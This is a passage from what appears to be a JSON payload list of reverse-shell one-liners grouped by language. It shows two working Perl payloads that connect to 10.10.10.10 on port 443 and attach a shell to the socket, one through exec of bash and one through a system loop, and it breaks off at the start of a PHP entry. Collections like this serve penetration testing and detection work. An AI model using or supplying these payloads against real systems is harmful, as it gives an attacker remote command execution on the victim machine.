    },
    "Perl":{
        "perl":"perl -e 'use Socket;$i=\"10.10.10.10\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -\");};'",
        "perl no sh":"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"10.10.10.10:443\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
    },
    "PHP":{
